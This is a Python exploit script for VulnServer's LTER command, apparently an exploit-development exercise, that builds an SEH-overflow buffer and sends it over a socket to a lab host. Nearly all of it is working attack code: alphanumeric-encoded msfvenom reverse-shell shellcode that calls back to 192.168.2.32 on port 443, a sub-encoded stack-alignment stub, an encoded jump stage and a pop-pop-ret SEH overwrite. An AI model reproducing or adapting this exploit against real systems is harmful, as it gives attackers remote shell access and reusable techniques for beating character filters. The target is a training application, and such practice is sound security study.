#!/usr/bin/python
#Written By: Eric Van Zutphen
#Purpose: VulnServer LTER SEH OverFlow Bad Character Restriction

import socket

"""
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.32 LPORT=443 -a x86 --platform windows -e x86/alpha_mixed BufferRegister=ESP -f python -v shellcode
Payload size: 702 bytes
"""
shellcode =  ""
shellcode += "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x79\x6c\x78\x68\x6c\x42\x65\x50"
shellcode += "\x53\x30\x37\x70\x31\x70\x4e\x69\x4a\x45\x76\x51"
shellcode += "\x49\x50\x71\x74\x6e\x6b\x70\x50\x46\x50\x6c\x4b"
shellcode += "\x61\x42\x46\x6c\x6e\x6b\x62\x72\x57\x64\x4c\x4b"
shellcode += "\x34\x32\x64\x68\x54\x4f\x6d\x67\x30\x4a\x57\x56"
shellcode += "\x56\x51\x6b\x4f\x6e\x4c\x57\x4c\x65\x31\x31\x6c"
shellcode += "\x43\x32\x36\x4c\x31\x30\x4b\x71\x48\x4f\x46\x6d"
shellcode += "\x77\x71\x69\x57\x58\x62\x39\x62\x43\x62\x30\x57"
shellcode += "\x6e\x6b\x51\x42\x64\x50\x4e\x6b\x53\x7a\x55\x6c"
shellcode += "\x6c\x4b\x70\x4c\x46\x71\x53\x48\x4b\x53\x50\x48"
shellcode += "\x53\x31\x7a\x71\x42\x71\x6e\x6b\x76\x39\x65\x70"
shellcode += "\x63\x31\x69\x43\x4e\x6b\x43\x79\x44\x58\x6d\x33"
shellcode += "\x35\x6a\x62\x69\x6c\x4b\x65\x64\x6c\x4b\x75\x51"
shellcode += "\x49\x46\x50\x31\x4b\x4f\x6c\x6c\x69\x51\x38\x4f"
shellcode += "\x56\x6d\x47\x71\x38\x47\x35\x68\x79\x70\x50\x75"
shellcode += "\x48\x76\x36\x63\x31\x6d\x79\x68\x55\x6b\x53\x4d"
shellcode += "\x54\x64\x42\x55\x38\x64\x62\x78\x6e\x6b\x51\x48"
shellcode += "\x46\x44\x33\x31\x79\x43\x61\x76\x6c\x4b\x34\x4c"
shellcode += "\x70\x4b\x4e\x6b\x43\x68\x35\x4c\x53\x31\x58\x53"
shellcode += "\x6c\x4b\x67\x74\x4e\x6b\x75\x51\x7a\x70\x4e\x69"
shellcode += "\x37\x34\x37\x54\x36\x44\x63\x6b\x43\x6b\x53\x51"
shellcode += "\x70\x59\x30\x5a\x32\x71\x79\x6f\x69\x70\x31\x4f"
shellcode += "\x73\x6f\x33\x6a\x4e\x6b\x56\x72\x6a\x4b\x6e\x6d"
shellcode += "\x31\x4d\x70\x68\x77\x43\x44\x72\x33\x30\x35\x50"
shellcode += "\x50\x68\x64\x37\x42\x53\x44\x72\x51\x4f\x71\x44"
shellcode += "\x62\x48\x32\x6c\x32\x57\x77\x56\x53\x37\x39\x6f"
shellcode += "\x48\x55\x6c\x78\x6a\x30\x45\x51\x47\x70\x67\x70"
shellcode += "\x54\x69\x79\x54\x62\x74\x70\x50\x73\x58\x74\x69"
shellcode += "\x6d\x50\x62\x4b\x57\x70\x79\x6f\x48\x55\x42\x70"
shellcode += "\x46\x30\x32\x70\x30\x50\x77\x30\x66\x30\x31\x50"
shellcode += "\x32\x70\x30\x68\x48\x6a\x64\x4f\x6b\x6f\x39\x70"
shellcode += "\x49\x6f\x6e\x35\x6d\x47\x72\x4a\x77\x75\x75\x38"
shellcode += "\x6f\x30\x6d\x78\x63\x32\x37\x50\x62\x48\x46\x62"
shellcode += "\x45\x50\x67\x71\x6f\x4b\x4f\x79\x6d\x36\x72\x4a"
shellcode += "\x32\x30\x52\x76\x76\x37\x75\x38\x5a\x39\x4c\x65"
shellcode += "\x44\x34\x70\x61\x79\x6f\x4e\x35\x4b\x35\x59\x50"
shellcode += "\x64\x34\x74\x4c\x59\x6f\x42\x6e\x36\x68\x54\x35"
shellcode += "\x38\x6c\x70\x68\x6a\x50\x68\x35\x39\x32\x61\x46"
shellcode += "\x4b\x4f\x5a\x75\x42\x48\x50\x63\x42\x4d\x51\x74"
shellcode += "\x63\x30\x6e\x69\x48\x63\x50\x57\x33\x67\x51\x47"
shellcode += "\x64\x71\x79\x66\x30\x6a\x62\x32\x62\x79\x51\x46"
shellcode += "\x39\x72\x39\x6d\x53\x56\x6f\x37\x52\x64\x56\x44"
shellcode += "\x47\x4c\x36\x61\x46\x61\x6e\x6d\x30\x44\x54\x64"
shellcode += "\x54\x50\x6b\x76\x53\x30\x42\x64\x33\x64\x56\x30"
shellcode += "\x52\x76\x71\x46\x76\x36\x33\x76\x71\x46\x52\x6e"
shellcode += "\x33\x66\x73\x66\x63\x63\x63\x66\x73\x58\x64\x39"
shellcode += "\x78\x4c\x65\x6f\x6c\x46\x59\x6f\x49\x45\x6d\x59"
shellcode += "\x79\x70\x30\x4e\x33\x66\x53\x76\x59\x6f\x34\x70"
shellcode += "\x52\x48\x46\x68\x4e\x67\x75\x4d\x71\x70\x4b\x4f"
shellcode += "\x6a\x75\x4f\x4b\x4c\x30\x6f\x45\x79\x32\x72\x76"
shellcode += "\x42\x48\x69\x36\x5a\x35\x6d\x6d\x6d\x4d\x4b\x4f"
shellcode += "\x4b\x65\x37\x4c\x47\x76\x43\x4c\x65\x5a\x6b\x30"
shellcode += "\x39\x6b\x79\x70\x34\x35\x74\x45\x4f\x4b\x71\x57"
shellcode += "\x77\x63\x52\x52\x52\x4f\x33\x5a\x73\x30\x42\x73"
shellcode += "\x49\x6f\x4e\x35\x41\x41"

#EAX is already Zero so We will Align the Stack in EBX
first_stage= 'B'
subencode = '\x2D\x20\x20\x4C\x20' #sub eax, 0x204c2020
subencode += '\x2D\x20\x62\x7E\x61' #sub eax, 0x617e6220
subencode += '\x2D\x51\x7E\x7D\x7D' #sub eax, 0x7d7d7e51
subencode += '\x50\x5b' # push eax, pop ebx

"""
echo -ne "\x81\xC4\xEC\x03\x00\x00\xFF\xE4" | msfvenom -p - -a x86 --platform windows -e x86/alpha_mixed BufferRegister=EBX -f python -v jmpesp
"""
jmpesp = ""
jmpesp += "\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
jmpesp += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
jmpesp += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
jmpesp += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" # ADD ESP, 0x3EC
jmpesp += "\x42\x75\x4a\x49\x4d\x51\x4f\x34\x4a\x4c\x35\x53" # JMP ESP
jmpesp += "\x33\x30\x57\x70\x59\x6f\x49\x74\x41\x41"

#Address=6250120B
#Message=  0x6250120b : pop ecx # pop ecx # ret  | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\hacker\Desktop\essfunc.dll)
nseh = '\x7e\xFF\x20\x20' # character substitution FF = 80 126 Byte Jump Back
seh = '\x0B\x12\x50\x62' # ASCII SEH pop pop ret
nops = 'A' * 7



evil = 'LTER '
evil += nops +shellcode +  'A' * (3373- len(nops) - len(shellcode)) + subencode + jmpesp + first_stage * (126- len(subencode)- len(jmpesp)) + nseh + seh + 'D' * 493 + ".\n"

print 'Payload Length:[+] ' + str(len(evil)) + "  [+]"

print '[*] Sending Payload!'
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.2.31", 9999))
expl.send(evil)
expl.close()
